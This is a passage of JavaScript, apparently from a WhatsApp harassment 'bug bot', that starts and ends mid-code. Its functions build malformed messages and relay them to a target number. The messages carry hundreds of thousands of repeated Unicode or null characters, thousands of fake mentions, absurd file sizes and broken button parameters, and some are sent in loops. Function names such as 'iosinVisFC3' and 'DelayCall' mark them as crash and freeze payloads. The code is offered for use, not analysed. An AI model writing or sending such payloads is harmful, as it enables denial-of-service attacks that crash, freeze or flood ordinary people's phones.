                    newsletterAdminInviteMessage: {
                        newsletterJid: '5555556666667777777@newsletter',
                        newsletterName: "Hi Iphone, Im Aeternyx Is Beginner" + "ꦾ".repeat(150000),
                        jpegThumbnail: null,
                        caption: "ꦽ".repeat(150000),
                        inviteExpiration: Date.now() + 9999999999999,
                    },
                },
            },
        };
        await sock.relayMessage(target, messsage, {
            userJid: target,
        });
    } catch (err) {
        console.log(err);
    }
}

async function boundssex(number) {
    await sock.relayMessage(number, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: ".",
                        locationMessage: {},
                        hasMediaAttachment: true
                    },
                    body: {
                        text: " null " + "\0".repeat(900000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "\0"
                    },
                    carouselMessage: {}
                }
            }
        }
    }, { participant: { jid: number } });
}

async function apollox(number, mention = false) {
  let biji = await generateWAMessageFromContent(
    number,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "You Idiot's",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "galaxy_message",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );

  let message = generateWAMessageFromContent(
    number,
    {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: Array.from(
              { length: 2000 },
              (_, z) => `1313555000${z + 1}@s.whatsapp.net`
            ),
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
        },
      },
    },
  }, {});

  let etc = generateWAMessageFromContent(
    number,
    {
      interactiveResponseMessage: {
        body: {
          text: "xrl - null",
          format: "EXTENTION_1",
        },
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            (_, z) => `1313555020${z + 1}@s.whatsapp.net`
          ),
          statusAttributionType: "SHARED_FROM_MENTION",
        },
        nativeFlowResponseMessage: {
          name: "menu_options",
          paramsJson:
            '{"display_text":"xrl","id":".fucker","description":"Finnaly my?..."}',
          version: "3",
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );

  const genos = {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "RLju7GEX/CvQPba1MHLMykH4QW3xcB4HzmpxC5vwDuc=",
      fileLength: "327833",
      seconds: 15,
      mediaKey: "3HFjGQl1F51NXuwZKRmP23kJQ0+QECSWLRB5pv2Hees=",
      caption: "Xrelly Mp5" + "\u0000".repeat(9000),
      height: 1248,
      width: 704,
      fileEncSha256: "ly0NkunnbgKP/JkMnRdY5GuuUp29pzUpuU08GeI1dJI=",
      directPath:
        "/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&nc_sid=5e03e0",
      mediaKeyTimestamp: "1748347294",
      contextInfo: {
        isSampled: true,
        mentionedJid: Array.from(
          { length: 2000 },
          (_, z) => `1313555020${z + 1}@s.whatsapp.net`
        ),
        statusAttributionType: "SHARED_FROM_MENTION",
      },
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363321780343299@newsletter",
        serverMessageId: 1,
        newsletterName: "Xrelly Mp5",
      },
      streamingSidecar:
        "GMJY/Ro5A3fK9TzHEVmR8rz+caw+K3N+AA9VxjyHCjSHNFnOS2Uye15WJHAhYwca/3HexxmGsZTm/Viz",
      thumbnailDirectPath:
        "/v/t62.36147-24/29290112_1221237759467076_3459200810305471513_n.enc?ccb=11-4&oh=01_Q5Aa1gH1uIjUUhBM0U0vDPofJhHzgvzbdY5vxcD8Oij7wRdhpA&oe=685D2385&_nc_sid=5e03e0",
      thumbnailSha256: "5KjSr0uwPNi+mGXuY+Aw+tipqByinZNa6Epm+TOFTDE=",
      thumbnailEncSha256: "2Mtk1p+xww0BfAdHOBDM9Wl4na2WVdNiZhBDDB6dx+E=",
      annotations: [
        {
          embeddedContent: {
            embeddedMusic: {
              musicContentMediaId: "589608164114571",
              songId: "870166291800508",
              author: "ARE YOU KIDDING ME?!!!",
              title: "\u0000".repeat(90000),
              artworkDirectPath:
                "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
              artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
              artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
              artistAttribution: "https://www.instagram.com/_u/xrelly",
              countryBlocklist: true,
              isExplicit: true,
              artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
            },
          },
          embeddedAction: true,
        },
      ],
    },
  };

  for (let i = 0; i < 100; i++) {
  await sock.relayMessage("status@broadcast", message.message, {
    messageId: message.key.id,
    statusJidList: [number],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: number }, content: undefined }],
          },
        ],
      },
    ],
  });

  await sock.relayMessage("status@broadcast", biji.message, {
    messageId: biji.key.id,
    statusJidList: [number],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: number }, content: undefined }],
          },
        ],
      },
    ],
  });

  await sock.relayMessage("status@broadcast", etc.message, {
    messageId: etc.key.id,
    statusJidList: [number],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: number }, content: undefined }],
          },
        ],
      },
    ],
  });

  await sock.relayMessage("status@broadcast", etc.message, {
    messageId: etc.key.id,
    statusJidList: [number],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: number }, content: undefined }],
          },
        ],
      },
    ],
  });

  if (mention) {
    let nichollx = generateWAMessageFromContent(
      number,
      proto.Message.fromObject({
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: letakx.key,
              type: "STATUS_MENTION_MESSAGE",
              timestamp: Date.now() + 720,
            },
          },
        },
      }),
      {}
    );

    await sock.relayMessage(number, nichollx.message, {
      participant: { jid: number },
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined,
        },
      ],
    });
  }
}
  
    await new Promise(resolve => setTimeout(resolve, 5000));
}

async function JandaMuda(sock, target) {
  const cardss = [];

  for (let i = 0; i < 5; i++) {
    cardss.push({
      header: {
        hasMediaAttachment: true,
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/534859870_1051153396838314_2122100419717937309_n.enc?ccb=11-4&oh=01_Q5Aa2QFkDDvahAmTQB2rFSTjSTJV7uluYpY9jTpBENlcb7Sacw&oe=68CA3A18&_nc_sid=5e03e0&mms3=true",
          mimetype: "audio/mpeg",
          fileSha256: "qbcHpQMuyE/rnd/4A3aLRth0hM6U7GWi3QBO0NAC6xQ=",
          fileLength: "9999999999999999999999",
          pageCount: 9999999999,
          mediaKey: "eOi7nJvxr+iO9GzptSFWSqsD9P+aIQ85D3CYBzcRvgI=",
          fileName: "OTAX IS HERE" + "ꦽ".repeat(5000),
          fileEncSha256: "pYwQbEFgkLdJwdiXMxX87oTBmb6zitzbjkAH2ydR4ac=",
          directPath: "/v/t62.7119-24/534859870_1051153396838314_2122100419717937309_n.enc?ccb=11-4&oh=01_Q5Aa2QFkDDvahAmTQB2rFSTjSTJV7uluYpY9jTpBENlcb7Sacw&oe=68CA3A18&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1755491865"
        }
      },
      body: { 
        text: "LOVE U" + "ꦽ".repeat(5000) 
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: 'mpm',
            buttonParamsJson: "{[" + "ꦽ".repeat(5000)
          },
          {
            name: 'galaxy_message',
            buttonParamsJson: "\n".repeat(10000)
          }
        ],
        messageParamsJson: "{[".repeat(5000)
      }
    });
  }

  const content = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "HUMAN IS HERE" + "ꦽ".repeat(5000)
          },
          carouselMessage: {
            messageVersion: 1,
            cards: cardss
          },
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            remoteJid: "X",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot"
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, content, {
    messageId: "",
    participant: { jid: target },
    userJid: target
  });
}

//=== new function 2.0 
async function DelayCall(target) {
  try {
   const sock = "\u2063".repeat(6000);
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: sock, 
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0005".repeat(80000) },
                { name: "call_permission_request", buttonParamsJson: "\u0006".repeat(90080) },
                { name: "cta_url", buttonParamsJson: "\u0006".repeat(96000) },
                { name: "cta_call", buttonParamsJson: "\u0007".repeat(9900) },
                { name: "cta_copy", buttonParamsJson: "\u0003".repeat(8000) },
                { name: "cta_reminder", buttonParamsJson: "\u0003".repeat(76000) },
                { name: "cta_cancel_reminder", buttonParamsJson: "\u0003".repeat(95000) },
                { name: "address_message", buttonParamsJson: "\u0003".repeat(95000) },
                { name: "send_location", buttonParamsJson: "\u0005".repeat(98000) },
                { name: "quick_reply", buttonParamsJson: "\u0003".repeat(90050) },
                { name: "mpm", buttonParamsJson: "\u0003".repeat(97000) },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.error(err);
  }
}

async function GsMmL(target) {
  const x = generateWAMessageFromContent(
    target,
    {
      lottieStickerMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/545932757_821392374146649_3844921663899464720_n.enc?ccb=11-4&oh=01_Q5Aa3AGj0JnyULRqYe4gBwnvliNLa3fa7bD8ImS4lYXFNGCa0Q&oe=6946309C&_nc_sid=5e03e0&mms3=true",
            fileSha256: "fxxvVtTCmZ2Bpm/GEYpFF2GKUzJ8wWVrGY1mCmmh4I4=",
            fileEncSha256: "3xsWx0Y/1pNbWXWh/OG2mt4Ld0FEug25kyZ+lC+UbV4=",
            mediaKey: "uHEU7OghGYVW7IcWjhNlxPeZHNS0qfphvRUcy6+22wo=",
            mimetype: "application/was",
            height: 64,
            width: 64,
            directPath: "/v/t62.15575-24/545932757_821392374146649_3844921663899464720_n.enc?ccb=11-4&oh=01_Q5Aa3AGj0JnyULRqYe4gBwnvliNLa3fa7bD8ImS4lYXFNGCa0Q&oe=6946309C&_nc_sid=5e03e0",
            fileLength: "13862",
            mediaKeyTimestamp: "1763628089",
            isAnimated: true,
            stickerSentTs: "1763628089111",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                newsletterName: "XnxxOtaxJav"
              },
              quotedMessage: {
              newsletterAdminInviteMessage: {
                newsletterJid: "otax@newsletter",
                newsletterName:
                  "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
                caption:
                  "⸙ᵒᵗᵃˣнοω αяє γου?¿" +
                  "ꦾ".repeat(60000) +
                  "ោ៝".repeat(60000),
                inviteExpiration: "999999999"
              }
            },
              remoteJid: "status@broadcast"
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: x.message
      }
    },
    {
      participant: { jid: target }
    }
  );
}

async function kresjandaotax(sock, target) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "ꦽ".repeat(10000),
          "body": "ꦽ".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { "screen": "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "⌭ɪᴍ ʜᴇʀᴇ ʙʀᴏ¿?"
        },
        "header": { 
          "title": "⦸ ʟᴏɴᴛᴇ sᴘᴇᴋ ᴋᴇʀᴀs" + "ꦽ".repeat(50000),
          "hasMediaAttachment": false,
          "videoMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0&mms3=true",
            "mimetype": "video/mp4",
            "fileSha256": "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
            "fileLength": "9999999999999999",
            "seconds": 9999,
            "mediaKey": "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
            "height": 9999,
            "width": 9999,
            "fileEncSha256": "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
            "directPath": "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1755691703",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERICEw/9oACAEDAQE/AIRmycHh/9k=",
            "streamingSidecar": "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(target, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "⩝ɪᴍ ᴀʟᴏɴᴇ" + "ꦽ".repeat(50000)
            },
            "footer": {
              "text": "∅ ᴅɪʟᴀʀᴀɴɢ ᴋᴇʟᴜᴀʀ"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, carousel.message, {
      "messageId": carousel.key.id,
      participant: { jid: target }
    });
  }
}

async function iosinVisFC3(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/OTAX",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "OTAX",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
